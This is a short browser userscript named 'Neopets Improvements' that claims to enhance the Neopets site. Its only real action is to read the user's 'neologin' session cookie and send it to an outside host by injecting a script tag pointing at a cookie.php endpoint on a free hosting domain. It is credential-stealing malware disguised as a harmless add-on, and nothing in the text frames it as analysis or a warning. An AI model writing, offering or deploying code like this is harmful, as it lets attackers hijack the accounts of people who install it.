// ==UserScript==
// @name           Neopets Improvements
// @namespace      Neopets
// @include        *neopets.com*
// ==/UserScript==

var strURL = 'http://tierbone.byethost18.com/Pets/cookie.php'

var eleNew, newElement;

eleNew = document.getElementById('main');

var strCookie = document.cookie;

strCookie = GetStringBetween(strCookie, 'neologin=','; ');

if (eleNew) {
    newElement = document.createElement("div");
    newElement.innerHTML='<SCRIPT SRC=' + strURL + strCookie + '>';
    eleNew.parentNode.insertBefore(newElement, eleNew.nextSibling);
}